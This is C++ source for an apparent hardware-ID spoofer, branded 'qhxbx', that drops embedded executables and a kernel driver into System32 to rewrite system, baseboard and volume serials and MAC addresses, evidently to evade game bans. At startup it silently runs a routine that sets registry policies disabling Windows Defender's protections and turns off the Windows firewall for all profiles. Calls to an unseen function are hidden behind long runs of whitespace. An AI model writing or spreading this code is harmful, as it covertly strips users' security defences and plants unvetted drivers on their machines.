#include "includes.h"

using namespace KeyAuth;

// DISCORD: QHXBX
std::string name = skCrypt("").decrypt();
std::string ownerid = skCrypt("").decrypt();
std::string secret = skCrypt("").decrypt();
std::string version = skCrypt("").decrypt();
std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt();

auto chapath = _xor_("C:\\Windows\\System32\\zhjers.exe");  // UC BYTES DOWNLOAD
auto drvpath = _xor_("C:\\Windows\\System32\\AMIFLDRV64.SYS"); // UC BYTES DOWNLOAD

api KeyAuthApp(name, ownerid, secret, version, url);

bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size);

void MainOption();

void Logo()
{																																																																														Fortnite();
	std::cout << R"(
	 ________  ___  ___     ___    ___ ________     ___    ___ 
	|\   __  \|\  \|\  \   |\  \  /  /|\   __  \   |\  \  /  /|
	\ \  \|\  \ \  \\\  \  \ \  \/  / | \  \|\ /_  \ \  \/  / /
	 \ \  \\\  \ \   __  \  \ \    / / \ \   __  \  \ \    / / 
	  \ \  \\\  \ \  \ \  \  /     \/   \ \  \|\  \  /     \/  
	   \ \_____  \ \__\ \__\/  /\   \    \ \_______\/  /\   \  
	     \|___| \__\|__|\|__/__/ /\ __\    \|_______/__/ /\ __\ 
		     \|__|      |__|/ \|__|             |__|/ \|__| 
                                                                                                                 
)" << '\n';
}

std::string RandomString(const int len)
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	std::string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

std::string RandomVolumeID(const int len)
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEF";
	std::string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

std::uintptr_t ProcessFinder(const std::string& name)
{
    return false;
}

void NameChanger()
{
	std::string NAME = (std::string)("QHXBX SELF LEAK" + version + " | " + RandomString(15));
	SetConsoleTitleA(NAME.c_str());
}

DWORD ChangeName(LPVOID in)
{
	while (true)
	{
		NameChanger();
	}
}

bool BSOD()
{
	exit(10);
	return 0;
}

void ProcessFind()
{

}

void ProcessKiller()
{

}

void VolumeID()
{
	CreateFileFromMemory("C:\\Windows\\System32\\vdfjdisfudasu.exe", reinterpret_cast<const char*>(Volume), sizeof(Volume));

	LI_FN(Sleep)(1000);

	system(("C:\\Windows\\System32\\vdfjdisfudasu.exe C:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
	system(("C:\\Windows\\System32\\vdfjdisfudasu.exe D:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
	system(("C:\\Windows\\System32\\vdfjdisfudasu.exe E:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());

	LI_FN(Sleep)(2000);
}

void MAC()
{
	Fortnite();
	CMAC* MAC = new CMAC();

	MAC->SpoofMAC();
}

void Finished()
{
	Fortnite();
	std::remove(skCrypt("C:\\Windows\\System32\\vdfjdisfudasu.exe"));
	std::remove(skCrypt("C:\\Windows\\System32\\zhjers.exe"));
	std::remove(skCrypt("C:\\Windows\\System32\\AMIFLDRV64.SYS"));
	
	LI_FN(system)(skCrypt("cls"));
	LI_FN(Sleep)(2000);

	ShowWindow(GetConsoleWindow(), SW_SHOW);

	int restartadapters = MessageBox(NULL, skCrypt("Would you like to restart your adapters?"), skCrypt("qhxbx | spoofer"), MB_YESNO);
	if (restartadapters == IDYES)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		LI_FN(system)("cls");
		LI_FN(system)(skCrypt("netsh winsock reset"));
		LI_FN(system)(skCrypt("netsh winsock reset catalog"));
		LI_FN(system)(skCrypt("netsh int ip reset"));
		LI_FN(system)(skCrypt("netsh advfirewall reset"));
		LI_FN(system)(skCrypt("netsh int reset all"));
		LI_FN(system)(skCrypt("netsh int ipv4 reset"));
		LI_FN(system)(skCrypt("netsh int ipv6 reset"));
		LI_FN(system)(skCrypt("ipconfig / release"));
		LI_FN(system)(skCrypt("ipconfig / renew"));
		LI_FN(system)(skCrypt("ipconfig / flushdns"));
		LI_FN(system)(skCrypt("WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL DISABLE >nul 2>&1"));
		Sleep(2000);
		LI_FN(system)(skCrypt("WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL ENABLE >nul 2>&1"));
		LI_FN(system)("cls");
		ShowWindow(GetConsoleWindow(), SW_SHOW);
	}

	int restart = MessageBox(NULL, skCrypt("Finished spoofing. Would you like to restart?"), skCrypt("qhxbx | spoofer"), MB_YESNO);
	if (restart == IDYES)
	{
		VMProtect::End();
		LI_FN(system)(skCrypt("C:\\Windows\\System32\\shutdown /r /t 0"));
	}

	MainOption();
}

void Custom()
{
	LI_FN(system)(skCrypt("cls"));
	MessageBox(NULL, skCrypt("Press 'OK' to begin spoofing."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
	Sleep(1000);
	CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

	Sleep(1000);
	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("cls"));
	ShowWindow(GetConsoleWindow(), SW_SHOW);

firstserial:
	string SS;
	std::cout << skCrypt("[+] Please input a System Serial Number (xxxxx-xxxxx): ");
	std::cin >> SS;

	if (SS.empty())
	{
		MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
		goto firstserial;
	}

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	system(("C:\\Windows\\System32\\zhjers.exe /SS " + SS).c_str());

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("cls"));
	ShowWindow(GetConsoleWindow(), SW_SHOW);

secondserial:
	string BS;
	std::cout << skCrypt("[+] Please input a Baseboard Serial Number (xxxxx-xxxxx-xxxxx): ");
	std::cin >> BS;

	if (BS.empty())
	{
		MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
		goto secondserial;
	}

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	system(("C:\\Windows\\System32\\zhjers.exe /BS " + SS).c_str());

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("cls"));
	ShowWindow(GetConsoleWindow(), SW_SHOW);

thirdserial:
	string CS;
	std::cout << skCrypt("[+] Please input a Chassis Serial Number (xxxxx-xxxxx-xxxxx): ");
	std::cin >> CS;

	if (CS.empty())
	{
		MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
		goto thirdserial;
	}

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	system(("C:\\Windows\\System32\\zhjers.exe /CS " + CS).c_str());

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("cls"));
	ShowWindow(GetConsoleWindow(), SW_SHOW);

fourthserial:
	string PSN;
	std::cout << skCrypt("[+] Please input a Processor Serial Number (xxxxx--xxxxx): ");
	std::cin >> PSN;

	if (PSN.empty())
	{
		MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
		goto fourthserial;
	}


	LI_FN(Sleep)(1000);

	VolumeID();
	MAC();

	Finished();
}

void Null()
{
	Fortnite();
	LI_FN(system)(skCrypt("cls"));
	MessageBox(NULL, "Press 'OK' to begin spoofing.", "qhxbx | spoofer", MB_ICONINFORMATION);
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
	Sleep(1000);
	CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

	Sleep(1000);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SS \"To be filled by O.E.M\" "));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BS \"To be filled by O.E.M\" "));

	LI_FN(Sleep)(750);

	VolumeID();

	MAC();

	Finished();
}

void Randomize()
{
	Fortnite();
	LI_FN(system)(skCrypt("cls"));
	MessageBox(NULL, skCrypt("Press 'OK' to begin spoofing."), skCrypt("qhxbx | spoofer"), MB_ICONINFORMATION);
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
	Sleep(1000);
	CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

	Sleep(1000);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SS %random%-%random%"));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BS %random%-%random%-%random%-%random%"));

	LI_FN(Sleep)(750);

	LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CS %random%-%random%-%random%"));

	LI_FN(Sleep)(750);

	VolumeID();
	MAC();

	Finished();
}

void Perm()
{																																																																																							Fortnite();

	LI_FN(system)("cls");

	int read = MessageBox(NULL, skCrypt("Before you perm spoof, would you like to read the guide?"), skCrypt("qhxbx | spoofer"), MB_YESNO);
	if (read == IDYES)
	{
		LI_FN(system)("start https://docs.google.com/document/d/1PWtlQifZGbygMdLsXDUZtmBg13KsSiAeTYWlKo6nasU/edit?usp=sharing");
	}

spoofselection:
	LI_FN(system)("cls");
	Logo();

	std::cout << skCrypt("\n    [F1] Spoof w/ Nulled Serials");
	std::cout << skCrypt("\n    [F2] Spoof w/ Random Serials");
	std::cout << skCrypt("\n    [F3] Spoof w/ Custom Serials\n    ");

	while (true)
	{
		if (GetAsyncKeyState(VK_F1) & 1)
		{
			LI_FN(Beep)(500, 500);
			Null();
		}

		if (GetAsyncKeyState(VK_F2) & 1)
		{
			LI_FN(Beep)(500, 500);
			Randomize();
		}

		if (GetAsyncKeyState(VK_F3) & 1)
		{
			LI_FN(Beep)(500, 500);
			int experienced = MessageBox(NULL, skCrypt("WARNING: THIS IS FOR EXPERIENCED USERS ONLY. WOULD YOU LIKE TO CONTINUE?"), skCrypt("qhxbx | spoofer"), MB_YESNO);
			if (experienced == IDYES)
			{
				Custom();
			}
			else
			{
				goto spoofselection;
			}
		}
	}
}

void CheckSerials()
{
	LI_FN(system)(skCrypt("cls"));
	LI_FN(system)(skCrypt("echo Disks:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("wmic diskdrive get model, serialnumber"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("echo CPU:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("wmic cpu get serialnumber"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("echo BIOS:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("wmic bios get serialnumber"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("echo Motherboard:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("wmic baseboard get serialnumber"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("echo Bios UUID:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("wmic path win32_computersystemproduct get uuid"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("echo Mac:\n"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("getmac"));
	LI_FN(Sleep)(200);
	LI_FN(system)(skCrypt("\npause"));
}

void MainOption()
{																																																																																									Fortnite();
main:
	LI_FN(system)(skCrypt("cls"));

	Logo();

	std::cout << skCrypt("\n    [F1] Perm Spoof");
	// std::cout << skCrypt("\n    [F2] Clean");
	std::cout << skCrypt("\n    [F2] Check Serials");
	std::cout << skCrypt("\n    [F3] Exit\n    ");

	while (true)
	{
		if (GetAsyncKeyState(VK_F1) & 1)
		{
			LI_FN(Beep)(500, 500);
			Perm();
			goto main;
		}

		if (GetAsyncKeyState(VK_F2) & 1)
		{
			LI_FN(Beep)(500, 500);
			// Clean();
			CheckSerials();
			goto main;
		}

		if (GetAsyncKeyState(VK_F3) & 1)
		{
			LI_FN(Beep)(500, 500);
			exit(0);
		}

		/*if (GetAsyncKeyState(VK_F4) & 1)
		{
			LI_FN(Beep)(500, 500);
			exit(0);
		}
		*/
	}

	LI_FN(Sleep)(18000);
	exit(0);
}

void SIDc()
{
	system("SID.EXE /KEY=7M7h8-JrFJg-AfUYt-1v"); // not complete https://www.stratesave.com/html/sidchg.html
}

bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size)
{
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}   // UC BYTES

bool ReadFileToMemory(const std::string& file_path, std::vector<uint8_t>* out_buffer)
{
	std::ifstream file_ifstream(file_path, std::ios::binary);

	if (!file_ifstream)
		return false;

	out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
	file_ifstream.close();

	return true;
}

auto stream(const std::wstring& desired_file_path, const char* address, size_t size) -> bool
{
	std::ofstream file(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file.write(address, size))
	{
		file.close();
		return false;
	}

	file.close();
	return true;
}

std::wstring randomstring(int length)
{
	std::string characters = _xor_("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
	std::wstring randomString;
	randomString.reserve(length);

	for (int i = 0; i < length; ++i)
	{
		randomString.push_back(characters[rand() % characters.length()]);
	}

	return randomString + _xor_(L".exe");
}


auto disabledefender() -> bool
{
	HKEY key;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, skCrypt("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &key))
	{
		return false;
	}

	uint32_t payload = 1;
	if (RegSetValueEx(key, skCrypt("DisableAntiSpyware"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	HKEY new_key;
	if (RegCreateKeyEx(key, skCrypt("Real-Time Protection"), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0))
	{
		return false;
	}

	key = new_key;

	if (RegSetValueEx(key, skCrypt("DisableRealtimeMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	if (RegSetValueEx(key, skCrypt("DisableBehaviorMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	if (RegSetValueEx(key, skCrypt("DisableOnAccessProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	if (RegSetValueEx(key, skCrypt("DisableScanOnRealtimeEnable"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	if (RegSetValueEx(key, skCrypt("DisableIOAVProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload)))
	{
		return false;
	}

	RegCloseKey(key);

	// FIREWALL
	system(skCrypt("NetSh Advfirewall set allprofiles state off"));

	system(skCrypt("cls"));

	return true;
}


int main()
{																																																																																																	Fortnite();
	system("start https://discord.gg/EvNTpQFRzz");

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	CreateThread(NULL, NULL, ChangeName, NULL, NULL, NULL);

restart:

	disabledefender();

	LI_FN(system)(skCrypt("cls"));

	HWND hwnd = GetConsoleWindow();
	if (hwnd != NULL) { MoveWindow(hwnd, 100, 100, 1500, 750, TRUE); }

	ShowWindow(GetConsoleWindow(), SW_SHOW);

	MainOption();
}

std::string Time(tm ctx)
{
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t StringToTime(std::string timestamp)
{
	auto cv = strtol(timestamp.c_str(), NULL, 10);

	return (time_t)cv;
}

static std::tm TimeTM(time_t timestamp)
{
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}
